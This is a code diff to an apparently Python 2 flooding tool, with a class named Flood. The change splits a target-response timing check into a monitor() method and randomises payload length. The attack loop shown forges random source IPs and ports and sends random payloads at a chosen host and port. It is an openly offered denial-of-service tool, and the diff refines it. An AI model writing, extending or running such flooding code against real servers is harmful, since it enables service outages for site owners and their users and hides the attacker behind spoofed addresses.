@@ -21,6 +21,7 @@ try:
 	import math
 	import threading
 	import os
+	import sched
 except ImportError as e:
 	raise ImportError('Error importing!')
 	print e
@@ -31,28 +32,30 @@ class Flood:
 	def cls(self):
 	    os.system('cls' if os.name == 'nt' else 'clear')
 
-	def attack(self, args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen):
+
+	def monitor(self, dstUrl, dstIp):
+		s = sched.scheduler(time.time, time.sleep)
+
+		#queue timer
+		startTime=time.time()
+		#run a check every x seconds
+		try:
+		#uses http://docs.python-requests.org/en/master/api/
+			response = requests.get(dstUrl) #basic auth needs a header Authorization: Basic 
+		except requests.exceptions.RequestException as e:
+			print e
+			sys.exit(1)
+		#measure ET
+
+		elapsedTime = str(round((time.time()-startTime)*1000.0))
+		#tell the user
+		print 'Target web server '+ str(dstIp)+' responded with HTTP ' +str(response.status_code)+' in '+"{:<1}".format(str(elapsedTime)) +'ms'
+
+		return elapsedTime
+
+	def attack(self, args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen, elapsedTime):
 		#attack loop
 		while 1:
-
-			#queue timer
-			startTime=time.time()
-
-			#run a check every x seconds
-			try:
-			#uses http://docs.python-requests.org/en/master/api/
-				response = requests.get(dstUrl) #basic auth needs a header Authorization: Basic 
-			except requests.exceptions.RequestException as e:
-				print e
-				sys.exit(1)
-			#measure ET
-			elapsedTime = str(round((time.time()-startTime)*1000.0))
-
-			#tell the user
-			print 'Target web server '+ str(dstIp)+' responded with HTTP ' +str(response.status_code)+' in '+"{:<1}".format(str(elapsedTime)) +'ms'
-
-
-
 
 			#set random source ip
 			srcIp = '.'.join('%s'%random.randint(0, 255) for i in range(4))
@@ -60,11 +63,16 @@ class Flood:
 			#set random source port
 			srcPort = ''.join('%s'%random.randint(1,65535))
 
+			#randomize payload length under provided threshold between 1 to payloadlength
+			l=1
+			e=int(payloadLen)
+			randPayloadLen = random.randint(l,e)
+
 			#tell user what's happening
 			if args.verbose is True:print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)
 
-
-			payload = ''.join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') for r in range(int(payloadLen)))
+			#randomize payload chars given the randomized length
+			payload = ''.join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') for r in range(int(randPayloadLen)))
 
 			#threaded jobs list
 			jobs = []
@@ -170,8 +178,9 @@ def main():
 
 	sendattack = Flood()
 	sendattack.cls()
-	#sendattack.timer(dstUrl, dstIp)
-	sendattack.attack(args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen)
+	elapsedTime = sendattack.monitor(dstUrl, dstIp)
+	
+	sendattack.attack(args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen, elapsedTime)
 
 
 
